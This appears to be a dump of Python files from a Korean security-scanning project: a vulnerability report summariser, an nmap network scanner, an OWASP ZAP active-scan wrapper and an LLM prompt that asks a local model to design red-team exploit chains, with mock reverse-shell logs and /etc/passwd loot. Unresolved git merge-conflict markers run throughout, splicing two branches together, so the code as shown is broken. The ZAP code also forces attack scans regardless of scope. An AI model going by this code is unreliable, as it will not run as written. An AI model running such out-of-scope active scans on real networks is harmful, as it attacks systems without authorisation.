        high = sum(1 for v in vulnerabilities if v.get("severity") == "HIGH")
        medium = sum(1 for v in vulnerabilities if v.get("severity") == "MEDIUM")
        low = sum(1 for v in vulnerabilities if v.get("severity") == "LOW")
        
        # 평균 CVSS 점수
        cvss_scores = [v.get("cvss_score", 0) for v in vulnerabilities if v.get("cvss_score")]
        avg_cvss = sum(cvss_scores) / len(cvss_scores) if cvss_scores else 0.0
        
        summary = {
            "scan_date": datetime.now().isoformat(),
            "overview": {
                "total_vulnerabilities": total_vulns,
                "critical": critical,
                "high": high,
                "medium": medium,
                "low": low,
                "average_cvss": round(avg_cvss, 1)
            },
            "risk_assessment": {
                "overall_risk": "HIGH" if critical > 0 or high > 5 else "MEDIUM" if high > 0 else "LOW",
                "critical_findings": critical,
                "recommendation": self._generate_recommendation(critical, high)
            },
            "top_vulnerabilities": sorted(
                vulnerabilities,
                key=lambda v: v.get("cvss_score", 0),
                reverse=True
            )[:5],
            "attack_paths": attack_paths or [],
            "compliance": {
                "owasp_top10_mapping": self._map_to_owasp_top10(vulnerabilities),
                "cwe_mapping": self._map_to_cwe(vulnerabilities)
            }
        }
        
        return summary
    
    def _generate_recommendation(self, critical: int, high: int) -> str:
        """권장사항 생성"""
        if critical > 0:
            return "즉시 조치 필요: Critical 취약점 발견. 우선순위로 패치 및 완화 조치를 수행하세요."
        elif high > 5:
            return "긴급 조치 권장: 다수의 High 취약점 발견. 1주일 내 패치 계획 수립 필요."
        elif high > 0:
            return "조치 권장: High 취약점 발견. 1개월 내 패치 계획 수립 필요."
        else:
            return "지속적 모니터링: 현재 발견된 취약점은 낮은 우선순위입니다."
    
    def _map_to_owasp_top10(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, List[Dict]]:
        """OWASP Top 10 매핑"""
        owasp_mapping = {
            "A01:2021-Broken Access Control": [],
            "A02:2021-Cryptographic Failures": [],
            "A03:2021-Injection": [],
            "A04:2021-Insecure Design": [],
            "A05:2021-Security Misconfiguration": [],
            "A06:2021-Vulnerable Components": [],
            "A07:2021-Authentication Failures": [],
            "A08:2021-Software and Data Integrity": [],
            "A09:2021-Security Logging Failures": [],
            "A10:2021-Server-Side Request Forgery": []
        }
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get("type", "").lower()
            
            if "injection" in vuln_type or "sql" in vuln_type or "xss" in vuln_type:
                owasp_mapping["A03:2021-Injection"].append(vuln)
            elif "authentication" in vuln_type or "session" in vuln_type:
                owasp_mapping["A07:2021-Authentication Failures"].append(vuln)
            elif "ssrf" in vuln_type:
                owasp_mapping["A10:2021-Server-Side Request Forgery"].append(vuln)
            elif "access" in vuln_type or "idor" in vuln_type:
                owasp_mapping["A01:2021-Broken Access Control"].append(vuln)
            elif "misconfiguration" in vuln_type:
                owasp_mapping["A05:2021-Security Misconfiguration"].append(vuln)
        
        return owasp_mapping
    
    def _map_to_cwe(self, vulnerabilities: List[Dict[str, Any]]) -> Dict[str, List[Dict]]:
        """CWE ID 매핑"""
        cwe_mapping = {
            "CWE-89": [],  # SQL Injection
            "CWE-79": [],  # XSS
            "CWE-352": [],  # CSRF
            "CWE-22": [],  # Path Traversal
            "CWE-78": [],  # Command Injection
            "CWE-611": [],  # XXE
            "CWE-918": [],  # SSRF
            "CWE-434": [],  # File Upload
            "CWE-798": [],  # Hard-coded Credentials
            "CWE-200": []   # Information Exposure
        }
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get("type", "").lower()
            
            if "sql injection" in vuln_type:
                cwe_mapping["CWE-89"].append(vuln)
            elif "xss" in vuln_type:
                cwe_mapping["CWE-79"].append(vuln)
            elif "path traversal" in vuln_type or "lfi" in vuln_type:
                cwe_mapping["CWE-22"].append(vuln)
            elif "command injection" in vuln_type:
                cwe_mapping["CWE-78"].append(vuln)
            elif "xxe" in vuln_type:
                cwe_mapping["CWE-611"].append(vuln)
            elif "ssrf" in vuln_type:
                cwe_mapping["CWE-918"].append(vuln)
            elif "information" in vuln_type or "disclosure" in vuln_type:
                cwe_mapping["CWE-200"].append(vuln)
        
        return cwe_mapping
    
    def export_report(
        self,
        format: str = "json",
        output_file: Optional[str] = None
    ) -> str:
        """
        리포트 내보내기
        
        Args:
            format: "json", "html", "pdf"
            output_file: 출력 파일 경로
        """
        report = {
            "scan_date": datetime.now().isoformat(),
            "evidence": self.evidence_collection,
            "poc_scripts": self.poc_scripts
        }
        
        if format == "json":
            report_json = json.dumps(report, indent=2, ensure_ascii=False)
            if output_file:
                with open(output_file, 'w', encoding='utf-8') as f:
                    f.write(report_json)
            return report_json
        
        # HTML, PDF 형식은 추후 구현
        return ""

```
---

## File 38: scanner.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scanner.py`
=======
- **Root:** `d:\3차 프로젝트\6트\12.26 app`
- **Files included:** 19 (Total: 92)

---

## File 39: scanner.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\scanner.py`
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642

```python
import asyncio
import ipaddress
import subprocess
import xml.etree.ElementTree as ET
from typing import List, Dict, Any
import logging
import concurrent.futures

logger = logging.getLogger(__name__)

def parse_cidr(network_cidr: str) -> List[str]:
    """CIDR를 IP 리스트로 변환"""
    try:
        network = ipaddress.ip_network(network_cidr, strict=False)
        return [str(ip) for ip in network.hosts()]
    except ValueError as e:
        logger.error(f"Invalid CIDR: {network_cidr}, Error: {e}")
        return []

def discover_alive_hosts(network_cidr: str, timeout: int = 300) -> List[str]:
    """Nmap -sn으로 살아있는 호스트 탐지"""
    print(f"[DISCOVERY] 🔍 Discovering alive hosts in {network_cidr}...")
    logger.info(f"[DISCOVERY] Starting host discovery for {network_cidr}")
    
    alive_hosts = []
    
    try:
        # Nmap Ping Scan
        result = subprocess.run(
            ["nmap", "-sn", "-oX", "-", network_cidr],
            capture_output=True,
            text=True,
            timeout=timeout
        )
        
        if result.returncode != 0:
            print(f"[DISCOVERY] ✗ Nmap failed: {result.stderr}")
            return []
        
        # XML 파싱
        root = ET.fromstring(result.stdout)
        
        for host in root.findall('host'):
            status = host.find('status')
            if status is not None and status.get('state') == 'up':
                address = host.find('address')
                if address is not None:
                    ip = address.get('addr')
                    alive_hosts.append(ip)
                    print(f"[DISCOVERY] ✓ Found alive host: {ip}")
        
        print(f"[DISCOVERY] ✅ Found {len(alive_hosts)} alive hosts")
        logger.info(f"[DISCOVERY] Discovered {len(alive_hosts)} hosts")
        
    except subprocess.TimeoutExpired:
        print(f"[DISCOVERY] ✗ Discovery timeout after {timeout}s")
        logger.error(f"[DISCOVERY] Timeout after {timeout}s")
    except Exception as e:
        print(f"[DISCOVERY] ✗ Error: {e}")
        logger.error(f"[DISCOVERY] Error: {e}")
    
    return alive_hosts

def scan_single_host_sync(ip: str, ports: List[int] = [80, 443, 8080, 8000, 3000]) -> Dict[str, Any]:
    """
    단일 호스트 스캔 (동기 버전)
    
    Args:
        ip: 타겟 IP
        ports: 스캔할 포트 리스트
        
    Returns:
        스캔 결과
    """
    # 순환 import 방지: 함수 내부에서 import
<<<<<<< HEAD
    from ..workflow import async_scan_workflow
=======
    from ..api.routes import async_scan_workflow
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
    import asyncio
    
    print(f"[SCANNER] 🎯 Scanning {ip}...")
    logger.info(f"[SCANNER] Starting scan for {ip}")
    
    results = {
        "ip": ip,
        "scan_results": [],
        "total_cves": 0,
        "total_techs": 0
    }
    
    # 각 포트에 대해 스캔
    for port in ports:
        target = f"http://{ip}:{port}"
        
        try:
            # 새 이벤트 루프에서 실행
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                result = loop.run_until_complete(async_scan_workflow(target))
                
                if result and result.get('recon'):
                    technologies = []
                    for host in result.get('recon', []):
                        for port_info in host.get('ports', []):
                            technologies.append({
                                'product': port_info.get('product', 'Unknown'),
                                'version': port_info.get('version', 'N/A')
                            })
                    
                    cves = result.get('cves', [])
                    
                    if technologies or cves:
                        results["scan_results"].append({
                            "port": port,
                            "url": target,
                            "technologies": technologies,
                            "cves": cves
                        })
                        results["total_cves"] += len(cves)
                        results["total_techs"] += len(technologies)
                        
                        print(f"[SCANNER] ✓ {ip}:{port} - Found {len(technologies)} techs, {len(cves)} CVEs")
            finally:
                loop.close()
        
        except Exception as e:
            print(f"[SCANNER] ✗ {ip}:{port} - Error: {e}")
            logger.error(f"[SCANNER] Error scanning {ip}:{port}: {e}")
            continue
    
    return results

def run_network_scan(network_cidr: str, max_concurrent: int = 5) -> Dict[str, Any]:
    """
    네트워크 대역 전체 스캔 (ThreadPoolExecutor 사용)
    
    Args:
        network_cidr: 예) 192.168.1.0/24
        max_concurrent: 동시 실행 제한 (기본 5)
        
    Returns:
        전체 네트워크 스캔 결과
    """
    print("=" * 70)
    print(f"[NETWORK-SCAN] 🚀 Starting network scan: {network_cidr}")
    print(f"[NETWORK-SCAN] Max concurrent scans: {max_concurrent}")
    print("=" * 70)
    
    # 1단계: 살아있는 호스트 탐지
    alive_hosts = discover_alive_hosts(network_cidr)
    
    if not alive_hosts:
        print("[NETWORK-SCAN] ✗ No alive hosts found!")
        return {
            "network": network_cidr,
            "alive_hosts": 0,
            "scanned_hosts": 0,
            "results": []
        }
    
    # 2단계: ThreadPoolExecutor로 병렬 스캔
    print(f"[NETWORK-SCAN] 🔄 Starting parallel scan of {len(alive_hosts)} hosts...")
    
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_concurrent) as executor:
        future_to_ip = {executor.submit(scan_single_host_sync, ip): ip for ip in alive_hosts}
        
        for future in concurrent.futures.as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                result = future.result()
                results.append(result)
                print(f"[NETWORK-SCAN] ✓ Completed scan for {ip}")
            except Exception as e:
                print(f"[NETWORK-SCAN] ✗ Error scanning {ip}: {e}")
                logger.error(f"[NETWORK-SCAN] Error scanning {ip}: {e}")
    
    # 3단계: 결과 요약
    summary = {
        "network": network_cidr,
        "alive_hosts": len(alive_hosts),
        "scanned_hosts": len(results),
        "total_cves": sum(r.get("total_cves", 0) for r in results),
        "total_techs": sum(r.get("total_techs", 0) for r in results),
        "vulnerable_hosts": len([r for r in results if r.get("total_cves", 0) > 0]),
        "results": results
    }
    
    print("=" * 70)
    print(f"[NETWORK-SCAN] ✅ Network scan completed!")
    print(f"[NETWORK-SCAN] 📊 Summary:")
    print(f"  - Alive hosts: {summary['alive_hosts']}")
    print(f"  - Scanned hosts: {summary['scanned_hosts']}")
    print(f"  - Vulnerable hosts: {summary['vulnerable_hosts']}")
    print(f"  - Total CVEs: {summary['total_cves']}")
    print(f"  - Total technologies: {summary['total_techs']}")
    print("=" * 70)
    
    return summary
```
---

<<<<<<< HEAD
## File 39: __init__.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scanner\__init__.py`
=======
## File 40: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\scanner\__init__.py`
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642

```python
# app/core/scanner/__init__.py

from .zap_scanner import ZapScanner, format_alerts_for_dashboard

__all__ = ['ZapScanner', 'format_alerts_for_dashboard']
```
---

<<<<<<< HEAD
## File 40: zap_scanner.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scanner\zap_scanner.py`
=======
## File 41: zap_scanner.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\scanner\zap_scanner.py`
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642

```python
# app/core/scanner/zap_scanner.py

import time
import logging
from typing import Dict, List, Any, Optional
from zapv2 import ZAPv2
from app.config import Config

logger = logging.getLogger(__name__)

class ZapScanner:
    """
    OWASP ZAP API를 사용한 자동 보안 스캔 클래스
    Spider(크롤링) -> Active Scan(공격 스캔) -> Alert 수집
<<<<<<< HEAD
    
    [개선 사항] 2026-01-06
    - Katana/Nuclei 등 외부 도구에서 수집한 URL을 받아
      중복 크롤링 없이 즉시 Active Scan을 수행하는 최적화 모드 추가
=======
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
    """
    
    def __init__(
        self,
        api_key: str = None,
        proxy_host: str = None,
        proxy_port: int = None,
        timeout: int = None
    ):
        """ZAP 클라이언트 초기화"""
        self.api_key = api_key or Config.ZAP_API_KEY
        self.proxy_host = proxy_host or Config.ZAP_PROXY_HOST
        self.proxy_port = proxy_port or Config.ZAP_PROXY_PORT
        self.timeout = timeout or Config.ZAP_TIMEOUT
        
        proxies = {
            'http': f'http://{self.proxy_host}:{self.proxy_port}',
            'https': f'http://{self.proxy_host}:{self.proxy_port}'
        }
        
        try:
            self.zap = ZAPv2(apikey=self.api_key, proxies=proxies)
            logger.info(f"ZAP Client initialized: {self.proxy_host}:{self.proxy_port}")
        except Exception as e:
            logger.error(f"Failed to initialize ZAP client: {e}")
            raise

    def access_target(self, target_url: str) -> bool:
<<<<<<< HEAD
        """
        ZAP이 해당 URL을 인지하도록 단순 접속 (ZAP Tree 등록용)
        """
        try:
            # logger.info(f"Accessing target URL: {target_url}")
            # followredirects=True로 설정하여 최종 목적지까지 도달하게 함
            self.zap.core.access_url(url=target_url, followredirects=True)
            # time.sleep(1) # 너무 빠른 요청 방지
=======
        try:
            logger.info(f"Accessing target URL: {target_url}")
            self.zap.core.access_url(url=target_url, followredirects=True)
            time.sleep(2)
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
            return True
        except Exception as e:
            logger.error(f"Failed to access target: {e}")
            return False

    def run_spider(self, target_url: str, max_children: Optional[int] = None) -> Dict[str, Any]:
<<<<<<< HEAD
        """
        [Legacy] ZAP 자체 스파이더 실행 (느릴 수 있음)
        """
=======
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
        try:
            logger.info(f"Starting Spider scan on: {target_url}")
            if max_children is None:
                max_children = 100
            
            scan_id = self.zap.spider.scan(
                url=target_url,
                maxchildren=max_children,
                recurse=True
            )
            
            logger.info(f"Spider scan started. Scan ID: {scan_id}")
            
            start_time = time.time()
<<<<<<< HEAD
            timeout = 300  # 5분 제한
=======
            timeout = 60
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
            
            while True:
                try:
                    status = self.zap.spider.status(scan_id)
                    progress = int(status)
                    if progress >= 100:
                        break
                    if time.time() - start_time > timeout:
                        self.zap.spider.stop(scan_id)
                        break
                    time.sleep(2)
                except (ValueError, TypeError):
                    break
            
            urls_found = self.zap.spider.results(scan_id)
            return {
                'scan_id': scan_id,
                'status': 'completed',
                'urls_found': urls_found,
                'progress': 100
            }
        except Exception as e:
            logger.error(f"Spider scan failed: {e}")
            return {'status': 'failed', 'error': str(e)}

    def run_active_scan(self, target_url: str, recurse: bool = True, scan_policy_name: str = None, context_id: str = None) -> Dict[str, Any]:
<<<<<<< HEAD
        """
        단일 URL에 대한 Active Scan 실행
        """
=======
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
        try:
            logger.info(f"Starting Active Scan on: {target_url} (Recurse: {recurse})")
            scan_id = self.zap.ascan.scan(
                url=target_url,
                recurse=recurse,
                scanpolicyname=scan_policy_name,
                postdata=True,
                contextid=context_id
            )
            
            if not scan_id or scan_id == 'does_not_exist' or not str(scan_id).isdigit():
                return {'status': 'failed', 'error': f"Invalid scan ID: {scan_id}"}
            
<<<<<<< HEAD
            # 비동기 처리를 위해 대기하지 않고 ID만 리턴하는 것이 좋을 수 있으나,
            # 현재 구조상 대기 로직 유지 (타임아웃 적용)
=======
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
            start_time = time.time()
            while True:
                try:
                    status = self.zap.ascan.status(scan_id)
                    progress = int(status)
                    if progress >= 100:
                        break
                    if time.time() - start_time > self.timeout:
                        self.zap.ascan.stop(scan_id)
                        break
                    time.sleep(5)
                except (ValueError, TypeError):
                    break
            
            return {'scan_id': scan_id, 'status': 'completed', 'progress': 100}
        except Exception as e:
            logger.error(f"Active scan failed: {e}")
            return {'status': 'failed', 'error': str(e)}

<<<<<<< HEAD
    def run_active_scan_on_list(self, target_urls: List[str]) -> Dict[str, Any]:
        """
        [최적화됨] URL 리스트를 받아 '크롤링 없이' 즉시 공격 수행
        Katana 등으로 찾은 URL들을 한꺼번에 ZAP에 던져서 병렬 스캔 효과를 냄
        """
        logger.info(f"Starting Optimized ZAP Scan on {len(target_urls)} URLs (No Spidering)")
        
        scanned_count = 0
        failed_count = 0
        
        # 1. Seeding: ZAP이 URL들을 인식하도록 한 번씩 찔러줌
        for url in target_urls:
            self.access_target(url)
            
        # 2. Active Scan: 리스트에 있는 URL들만 타격 (recurse=False)
        for url in target_urls:
            try:
                # recurse=False: 하위 경로 탐색 금지 (이미 Katana가 다 찾음)
                # inscopeonly=False: 스코프 무관하게 강제 스캔
                scan_id = self.zap.ascan.scan(
                    url=url, 
                    recurse=False, 
                    inscopeonly=False
                )
                logger.debug(f"Launched Active Scan for: {url} (ID: {scan_id})")
                scanned_count += 1
            except Exception as e:
                logger.error(f"Failed to launch scan for {url}: {e}")
                failed_count += 1

        # 3. 모든 스캔이 끝날 때까지 대기
        self.wait_for_scans_to_finish()
        
        return {
            "status": "completed",
            "scanned_count": scanned_count,
            "failed_count": failed_count
        }

    def wait_for_scans_to_finish(self):
        """현재 실행 중인 모든 Active Scan이 완료될 때까지 대기"""
        logger.info("Waiting for all ZAP active scans to complete...")
        while True:
            try:
                scans = self.zap.ascan.scans
                if not scans:
                    break
                
                running_scans = [s for s in scans if s.get('state') != 'FINISHED']
                if not running_scans:
                    break
                    
                # 진행 상황 로깅 (선택 사항)
                # logger.debug(f"Remaining scans: {len(running_scans)}")
                time.sleep(5)
            except Exception:
                break
        logger.info("All ZAP active scans completed.")

=======
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
    def get_alerts(self, base_url: Optional[str] = None, risk_levels: Optional[List[str]] = None) -> List[Dict[str, Any]]:
        try:
            if risk_levels is None:
                risk_levels = ['High', 'Medium']
            
<<<<<<< HEAD
            # baseurl이 있으면 해당 사이트만, 없으면 전체 알림 가져오기
=======
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
            all_alerts = self.zap.core.alerts(baseurl=base_url)
            filtered_alerts = []
            
            for alert in all_alerts:
                if alert.get('risk') in risk_levels:
                    filtered_alerts.append({
                        'alert': alert.get('alert', ''),
                        'risk': alert.get('risk', ''),
                        'url': alert.get('url', ''),
                        'evidence': alert.get('evidence', ''),
                        'description': alert.get('description', ''),
                        'solution': alert.get('solution', ''),
                        'confidence': alert.get('confidence', '')
                    })
            return filtered_alerts
        except Exception as e:
            logger.error(f"Failed to fetch alerts: {e}")
            return []

    def targeted_scan(self, target_urls: List[str]) -> Dict[str, Any]:
        """
        Nuclei 등에서 발견된 특정 URL만 정밀 타격 (Funnel 전략)
<<<<<<< HEAD
        Legacy 호환성을 위해 유지하되, 내부적으로는 최적화 로직 사용 가능
        """
        return self.fast_scan_with_external_urls(target_urls)

    def full_scan(self, target_url: str, run_spider: bool = True, run_active: bool = True, risk_levels: List[str] = None) -> Dict[str, Any]:
        """
        [Legacy] 전체 스캔 워크플로우 (하위 호환성 유지)
        """
=======
        """
        results = {'scanned_urls': [], 'alerts': []}
        logger.info(f"Starting TARGETED ZAP SCAN on {len(target_urls)} URLs")
        
        for url in target_urls:
            try:
                self.access_target(url)
                scan_result = self.run_active_scan(url, recurse=False)
                results['scanned_urls'].append({'url': url, 'status': scan_result.get('status')})
            except Exception as e:
                logger.error(f"Failed targeted scan for {url}: {e}")
        
        results['alerts'] = self.get_alerts(risk_levels=['High', 'Medium', 'Low'])
        return results

    def full_scan(self, target_url: str, run_spider: bool = True, run_active: bool = True, risk_levels: List[str] = None) -> Dict[str, Any]:
        """전체 스캔 워크플로우"""
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642
        try:
            if not self.access_target(target_url):
                raise Exception("Failed to access target URL")
                
            spider_res = {}
            if run_spider:
                spider_res = self.run_spider(target_url)
                
            active_res = {}
            if run_active:
                active_res = self.run_active_scan(target_url)
                
            alerts = self.get_alerts(base_url=target_url, risk_levels=risk_levels)
            
            return {
                'target': target_url,
                'spider_result': spider_res,
                'active_scan_result': active_res,
                'alerts': alerts
            }
        except Exception as e:
            return {'error': str(e)}
<<<<<<< HEAD
            
    def fast_scan_with_external_urls(self, url_list: List[str]) -> Dict[str, Any]:
        """
        [NEW] Katana/Crawler 결과 리스트를 받아 고속 스캔 수행
        """
        try:
            if not url_list:
                return {'error': 'No URLs provided'}

            # 1. 스파이더 생략하고 바로 Active Scan 리스트 처리
            scan_result = self.run_active_scan_on_list(url_list)
            
            # 2. 결과(Alerts) 수집
            # 주의: base_url을 지정하지 않으면 ZAP에 쌓인 모든 알림을 가져옴
            # 필요하다면 url_list[0]의 도메인을 base_url로 추출해서 필터링 가능
            alerts = self.get_alerts(risk_levels=['High', 'Medium', 'Low'])
            
            return {
                'scan_summary': scan_result,
                'alerts': alerts
            }
        except Exception as e:
            logger.error(f"Fast scan failed: {e}")
            return {'error': str(e)}
=======
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642

def format_alerts_for_dashboard(alerts):
    """ZAP 경고 데이터를 대시보드 표시 형식으로 변환"""
    formatted = []
    for alert in alerts:
        formatted.append({
            'name': alert.get('alert', 'Unknown'),
            'risk': alert.get('risk', 'Informational'),
            'url': alert.get('url', ''),
            'description': alert.get('description', ''),
            'solution': alert.get('solution', ''),
            'evidence': alert.get('evidence', '')
        })
    return formatted
```
---

<<<<<<< HEAD
## File 41: __init__.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scenario\__init__.py`
=======
## File 42: __init__.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\scenario\__init__.py`
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642

```python
# Attack scenario generation modules

```
---

<<<<<<< HEAD
## File 42: generator.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scenario\generator.py`
=======
## File 43: generator.py
**Absolute Path:** `d:\3차 프로젝트\6트\12.26 app\app\core\scenario\generator.py`
>>>>>>> 6765f0338e4cc09c98a75bde603f7d50bbd85642

```python
# app/core/scenario/generator.py

<<<<<<< HEAD
import requests
import json
from flask import current_app


def build_executive_prompt(cve_list, recon_info, chains, exploit_map):
    """
    Executive Summary용 프롬프트 (간결한 보고서)
    """
    instructions = """
너는 15년 경력의 화이트해커이자 레드팀 리더야.
아래 제공하는 Nmap 스캔 결과(recon_info), CVE 목록(cve_list),
공격 체인 후보(chains), 그리고 각 CVE에 대한 Searchsploit exploit 리스트(exploit_map)를 바탕으로,
공격자 입장에서 가장 효율적인 '침투 체인(Exploit Chain)'을 설계해줘.

요구사항:

1. 반드시 chains에 있는 CVE들만 사용해서 공격 시나리오를 구성해.
   - 새로운 CVE ID를 만들어내거나, 입력에 없는 CVE를 사용하지 마.
2. 가능한 한 현실적인 1~2개의 공격 체인만 선택해서 상세 시나리오를 작성해.
   - 각 체인은 initial_access -> privilege_escalation -> lateral_movement -> data_exfiltration
     순서를 따르려고 노력해. 중간 단계가 없어도 괜찮지만, 순서를 뒤집지는 마.
3. Searchsploit ID는 "참고용"으로만 사용해.
   - 실제 payload 문자열이나 완전한 exploit 코드는 생성하지 말고,
     개념적인 단계와 영향만 설명해.
4. 모르는 부분은 지어내지 말고 "unknown"이라고 표기해.

출력 형식:

반드시 JSON 하나만 보내. 다른 설명 문장이나 주석은 넣지 마.

JSON 스키마 예시는 다음과 같아:

{
  "selected_chains": [
    {
      "chain_id": 1,
      "description": "요약 설명",
      "steps": [
        "1단계: CVE-XXXX-AAAA (initial_access), Searchsploit ID 50383을 참고하여 8080 포트 Apache 웹서버에서 Path Traversal 기반 RCE를 시도한다 ...",
        "2단계: CVE-YYYY-BBBB (privilege_escalation)를 이용해 www-data에서 root로 권한 상승을 시도한다 ...",
        "3단계: CVE-ZZZZ-CCCC (data_exfiltration)를 통해 MySQL DB에서 중요한 데이터를 덤프한다 ..."
      ]
    }
  ],
  "scenario": [
    "... 전체 공격 과정을 해커 입장에서 서술한 시나리오 ..."
  ],
  "proof": {
    "loot_files": [
      {
        "path": "/etc/passwd",
        "content": "root:x:0:0:root:/root:/bin/bash\n..."
      }
    ],
    "logs": [
      "[+] Exploit CVE-XXXX-AAAA sent to 203.0.113.10:8080",
      "[+] Got reverse shell: www-data@target",
      "[+] Escalated to root using CVE-YYYY-BBBB",
      "[+] Dumped /etc/passwd and user table from MySQL (size: 32KB)"
    ]
  },
  "mermaid_diagram": "graph TD\n    A[정찰: Nmap Scan] --> B[CVE-XXXX-AAAA: Initial Access]\n    B --> C[CVE-YYYY-BBBB: Privilege Escalation]\n    C --> D[CVE-ZZZZ-CCCC: Data Exfiltration]\n    D --> E[Mission Complete]"
}

주의:

- 실제 IP나 민감 정보는 모두 더미 값(예: 203.0.113.10, 198.51.100.5)으로 바꿔줘.
- selected_chains의 steps에는 반드시 어떤 CVE를 어떤 역할(role)로 쓰는지, 어느 포트/서비스와 연결되는지 명시해.
- **mermaid_diagram 필드를 반드시 포함해. Mermaid.js flowchart 문법으로 작성해.**
"""

    recon_text = json.dumps(recon_info, ensure_ascii=False, indent=2)
    cve_text = json.dumps(cve_list, ensure_ascii=False, indent=2)
    chains_text = json.dumps(chains, ensure_ascii=False, indent=2)
    exploit_text = json.dumps(exploit_map, ensure_ascii=False, indent=2)

    prompt = f"""{instructions}

[recon_info]
{recon_text}

[cve_list]
{cve_text}

[chains]
{chains_text}

[exploit_map]
{exploit_text}
"""
    return prompt


def build_prompt(cve_list, recon_info, chains, exploit_map):
    """
    기존 호환성을 위한 래퍼 함수
    """
    return build_executive_prompt(cve_list, recon_info, chains, exploit_map)


def call_ollama(prompt: str):
    """
    Ollama LLM 호출
    """
    base_url = current_app.config["OLLAMA_BASE_URL"]
    model = current_app.config["OLLAMA_MODEL"]
    url = f"{base_url}/api/generate"

    payload = {
        "model": model,
        "prompt": prompt,
        "stream": False,
    }

    try:
        resp = requests.post(url, json=payload, timeout=300)
        resp.raise_for_status()
    except requests.exceptions.RequestException as e:
        return {
            "selected_chains": [],
            "scenario": [f"[AI 호출 실패] {e}"],
            "proof": {
                "loot_files": [],
                "logs": [],
            },
            "mermaid_diagram": ""
        }

    data = resp.json()
    raw_text = data.get("response", "")

    try:
        parsed = json.loads(raw_text)
        
        # Mermaid diagram이 없으면 기본값 생성
        if "mermaid_diagram" not in parsed:
            parsed["mermaid_diagram"] = generate_default_mermaid(parsed.get("selected_chains", []))
        
        return parsed
    except json.JSONDecodeError:
        return {
            "selected_chains": [],
            "scenario": [raw_text],
            "proof": {
                "loot_files": [],
                "logs": [],
            },
            "mermaid_diagram": ""
        }


def generate_default_mermaid(chains):
    """
    LLM이 Mermaid를 생성하지 못했을 때 기본 다이어그램 생성
    """
    if not chains or len(chains) == 0:
        return "graph TD\n    A[No Attack Chain Available]"
    
    diagram = "graph TD\n"
    diagram += "    Start[정찰: Recon] --> Step1\n"
    
    for i, chain in enumerate(chains):
        steps = chain.get('steps', [])
        for j, step in enumerate(steps):
            node_id = f"Step{i+1}_{j+1}"
            # Extract CVE ID from step text
            import re
            cve_match = re.search(r'CVE-\d{4}-\d+', step)
            cve_id = cve_match.group(0) if cve_match else f"Step {j+1}"
            
            if j == 0:
                diagram += f"    Step1[{cve_id}] --> {node_id}\n"
            else:
                prev_node = f"Step{i+1}_{j}"
                diagram += f"    {prev_node}[{cve_id}] --> {node_id}\n"
    
    diagram += f"    Step{len(chains)}_{len(steps)}[Complete] --> End[Mission Complete]\n"
    
    return diagram
```
---

## File 43: reporter.py
**Absolute Path:** `d:\3차 프로젝트\worker_entry\app\core\scenario\reporter.py`
=======
"""
AI 기반 공격 시나리오 생성기 (CWE 정보 활용)
"""

import requests
import logging
from typing import List, Dict, Any

logger = logging.getLogger(__name__)

def extract_cwe_from_cve(cve_data: Dict[str, Any]) -> List[str]:
    """
    🆕 CVE 데이터에서 CWE ID 추출
    """
    cwes = []
    try:
        cve = cve_data.get("cve", {})
        weaknesses = cve.get("weaknesses", [])
        
        for weakness in weaknesses:
            descriptions = weakness.get("description", [])
            for desc in descriptions:
                if desc.get("lang") == "en":
                    cwe_value = desc.get("value", "")
                    if cwe_value.startswith("CWE-"):
                        cwes.append(cwe_value)
    except Exception as e:
        logger.warning(f"[CWE] Failed to extract CWE: {e}")
    
    return cwes

def build_prompt(recon_result, cves, verification_results=None):
    """
    AI 프롬프트 생성 (기존 로직 유지)
    """
    # 1. 타겟 정보 추출
    target_info = ""
    if recon_result and len(recon_result) > 0:
        if isinstance(recon_result[0], dict):
            host = recon_result[0]
            ip = host.get("ip", "unknown")
            ports = host.get("ports", [])
            
            target_info = f"- IP 주소: {ip}\n"
            target_info += f"- 오픈 포트: {len(ports)}개\n"
            
            # 주요 서비스 추출
            services = []
            for port in ports[:5]:  # 상위 5개만
                service_name = port.get("service", "unknown")
                port_num = port.get("port", "?")
                product = port.get("product", "")
                version = port.get("version", "")
                
                service_str = f"{service_name}/{port_num}"
                if product:
                    service_str += f" ({product}"
                    if version:
                        service_str += f" {version}"
                    service_str += ")"
                
                services.append(service_str)
            
            if services:
                target_info += "- 주요 서비스:\n"
                for svc in services:
                    target_info += f"  * {svc}\n"
        else:
            target_info = "- 타겟 정보 없음 (Recon 결과 형식 불일치)\n"
    
    # 2. CVE 정보 요약
    cve_summary = ""
    if cves and len(cves) > 0:
        # CVSS 점수별로 분류
        critical_cves = [c for c in cves if isinstance(c, dict) and c.get("cvss", 0) >= 9.0]
        high_cves = [c for c in cves if isinstance(c, dict) and 7.0 <= c.get("cvss", 0) < 9.0]
